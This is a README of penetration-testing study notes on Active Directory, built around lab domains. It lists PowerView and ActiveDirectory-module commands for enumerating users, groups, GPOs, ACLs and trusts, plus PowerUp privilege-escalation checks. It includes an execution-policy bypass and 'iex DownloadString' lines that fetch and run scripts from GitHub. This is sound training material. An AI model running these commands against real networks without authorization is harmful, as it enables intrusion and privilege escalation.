<div align="center">
<h1> Attacking and Defending Active Directory :nepal: </h1>
<a href="https://twitter.com/nirajkharel7" ><img src="https://img.shields.io/twitter/follow/nirajkharel7?style=social" /> </a>
</div>

## Domain Enumerationn Part 1
- The enumeration can be done by using Native executables and .NET classes
- `$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]`
- `$ADClass::GetCurrentDomain()`
- Where `DirectoryServices.ActiveDirectory.Domain` is a class and `GetCurrentDomain()` is a static method.

**Domain Enumeration with Powerview and AD PowerShell module**
- To speed up things we can use Powerview:
- `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`

- The Active Directory PowerShell module
- `https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps`
- `https://github.com/samratashok/ADModule`
- (To use ActiveDirectory module without installing RSAT, we can use Import-Module for the valid ActiveDirectory module DLL)

**Run unrestricted commands with powershell**
- `powershell -ep bypass`
- **Powerview Script Download**
- `iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/PowerView.ps1')`
- **ActiveDirectory Module Download**
- `https://github.com/samratashok/ADModule` Download and Execute with `. .\Import-ActiveDirectory.ps1;Import-ActiveDirectory`
-  or
- `iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory `

**Get Current Domain**
- `Get-NetDomain` (Powerview)
- `Get-ADDomain` (ActiveDirectory Module)

**Get object of another domain**
- `Get-NetDomain -Domain <domain-name>`
- `Get-ADDomain -Identity <domain-name>`

**Get Domain SID for the current domain**
- `Get-DomainSID`
- `(Get-ADDomain).DomainSID`

**Get domain policy for the current domain**
- `Get-DomainPolicy`
- `(Get-DomainPolicy)."system acccess"`

**Get domain policy for another domain**
- `(Get-DomainPolicy -domain moneycorp.local)".system access"`

**Get domain controllers for the current domain**
- `Get-NetDomainController`
- `Get-ADDomainController`

**Get domain controllers for another domain**
- `Get-NetDomainController -Domain <domain-name>`
- `Get-ADDomainController -DomainName <domain-name> -Discover`

**Get a list of users in the current domain**
- `Get-NetUser`
- `Get-NetUser -Username <username>`
- `Get-ADUser -Filter * -Properties *`
- `Get-ADUser -Identity <username> -Properties *`

**Get list of all properties for users in the current domain**
- `Get-UserProperty`
- `Get-UserProperty -Properties pwlastset`
- `Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name`
- `Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}`

**Search for a particular string in a user's attributes**
- `Find-UserField -SearchField Description`
- `Find-UserField -SearchField Description -SearchTerm "built"`
- `Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description`

## Domain Enumeration Part 2
**Get a list of computers in the current domain**
- `Get-NetComputer`
- `Get-NetComputer -OperatingSystem "*Server 2016"`
- `Get-NetComputer -Ping`
- `Get-NetComputer -FullData`
- `Get-ADComputer -Filter *`
- `Get-ADComputer -Filter * | select Name`

**Get all the groups in the current domain**
- `Get-NetGroup`
- `Get-NetGroup -Domain <targetDomain>`
- `Get-NetGroup -FullData`
- `Get-ADGroup -Filter * | select name`
- `Get-ADGroup -Filter * -Properties *`

**Get all groups containing the word "admin" in group name**
- `Get-NetGroup -GroupName *admin*`
- `Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`

**Get all the members of the Domain Admins Group**
- `Get-NetGroupMember -GroupName "Domain Admins" -Recurse`
- `Get-ADGroupMember -Identity "Domain Admins" -Recursive`

**Get the group membership for a user**
- `Get-NetGroup -Username "student1"`
- `Get-ADPrincipalGroupMembership -Identity student1`

**List all the local groups on a machine (needs administrator privs on non-dc machines**
- `Get-NetLocalGroup -ComputerName dcorp-dc.dollarccorp.moneycorp.local -ListGroups`

**Get members of all the local groups on a machine (needs administrator privs o non-dc machines)**
- `Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse`

**Get actively logged users on a computer (needs local admin rights on the target)**
- `Get-NetLoggedon -ComputerName <servername>`

**Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)**
- `Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local`

**Get the last logged user on a computer (needs administrative rights and remote registry on the target)**
- `Get-LastLoggedOn -ComputerName <servername>`

**Find shares on hosts in current domain**
- `Invoke-ShareFinder -Verbose`

**Find sensitive files on computer in the domain**
- `Invoke-FileFinder -Verbose`

**Get all fileservers of the domain**
- `Get-NetFileServer`

## Domain Enumeration Part 3
**Domain Enumeration - GPO**
- Group Policy provides the ability to manage configuration and changes easily and centrally in AD.
- Allows configuration of
  - Security Settings
  - Registry-based policy settings
  - Group policy preferences like startup/shutdown/log-on/logogg scripts settings
  - Software installation
- GPO can be abused for various attacks like privesc, backdoors, persistence etc.

**Get list of GPO in current domain**
- `Get-NetGPO`
- `Get-NetGPO | select displayname`
- `Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local`
- `Get-GPO -All` (GroupPolicy module)
- `Get-GPResultantSetofPolicy -ReportType Html -Path C:\Users\Administrator\report.html` (Provides RSoP)

**Get GPO(s) which use Restricted Groups or groups.xml for interesting users**
- `Get-NetGPOGroup`

**Access Control Model**
- Enables control on the ability of a process to access objects and other resources in active directory based on:
  - Access Tokens (security context of a process - identity and privs of user)
  - Security Descriptors (SID of the owner, Discretionary ACL (DACL)and System ACL (SACL))

**Access Control List (ACL)**
- It is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits access. Who has permission and what can be done on an objecct?
- Two types:
  - DACL : Defines the permissions trustees (a user or group) have on an object.
  - SACL : Logs success and failure audit messages when an objecct is accessed.
- ACLs are vital to security architecture of AD.

**Get the ACLs associated with the specified object**
- `Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs`

**Get the ACLs associated with the specific prefix to be used for search**
- `Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose`

**We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs**
- `(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access`

**Get the ACLs associated with the specific LDAP path to be used for search**
- `Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDS -Verbose`

**Search for interesting ACEs**
- `Invoke-ACLScanner -ResolveGUIDs`

**Get the ACLs associated with the specified path**
- `Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"`


## Domain Enumeration Part 4 - Trusts
**Get a list of all domain trusts for the current domain**
- `Get-NetDomainTrust`
- `Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local`
- `Get-ADTrust`
- `Get-ADTrust -Identity us.dollarcorp.moneycorp.local`

**Get details about the current forest**
- `Get-NetForest`
- `Get-NetForest -Forest eurocorp.local`
- `Get-ADForest`
- `Get-ADForest -Identity eurocorp.local`

**Get all domains in the current forest**
- `Get-NetForestDomain`
- `Get-NetForestDomain -Forest eurocorp.local`
- `(Get-ADForest).Domains`

**Get all global cataogs for the current forest**
- `Get-NetForestCatalog`
- `Get-NetForestCatalog -Forest eurocorp.local`
- `Get-ADForest | select -ExpandProperty GlobalCatalogs`

**Map trusts of a forest**
- `Get-NetForestTrust`
- `Get-NetForestTrust -Forest eurocorp.local`
- `Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'`

**Find all machines on the current domain where the current user has local admin access**
- `Find-LocalAdminAccess -Verbose`
- This function queries the DC of the current or provided domain for a list of computers `(Get-NetComputer)` and then use multi-threaded `Invoke-CheckLocalAdminAccess` on each machine.
- This can also be done with the help of remote administration tools like WMI and PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked. `Find-WMILocalAdminAccess.ps1`

**Find local admins on all machines of the domain (needs administrator privs on non-dc machines)**
- `Invoke-EnumerateLocalAdmin -Verbose`
- This function queries the DC of the current or provided domain for a list of computers `(Get-NetComputer)` and then use multi-threaded `Get-NetLocalGroup` on each machine.


## Local Privilege Escalation Part I
**In an AD environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following**
 - Hunting for Local Admin access on other machines.
 - Hunting for high privlege domain accounts (like a Domain Administrator)

**There are various ways of locally escalating privileges on Windows box:**
 - Missing patches
 - Automated deployment and AutoLogon passwords in clear text.
 - AlaysInstallElevated (Any user can run MSI as SYSTEM)
 - Misconfigured Services
 - DLL Hijacking and more

**We can use below tools for complete coverage**
 - PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 - BeRoot : https://github.com/AlessandroZ/BeRoot
 - Privesc : https://github.com/enjoiz/Privesc

**Services Issues using PowerUp**
- Get services with unquoted paths and a space in their name
- `Get-ServiceUnquoted -Verbose`
- If the path is unquoted under the root directory which means `C:/Tes File/test/test.exe`, we cannot perform this privilege escalation method because to drop an executable under the C:/ Path, we need to be administrator already.
- Get services where the current user can write to its binary path or change arguments to the binary
- `Get-ModifiableServiceFile -Verbose`
- Get the services whose configuration current user can modify.
- `Get-ModifiableService -Verbose`

**Run all checks from:**
- PowerUp : `Invoke-AllChecks`
- BeRoot is an executable : '.\beRoot.exe'
- Priesc : `Invoke-PrivEsc`
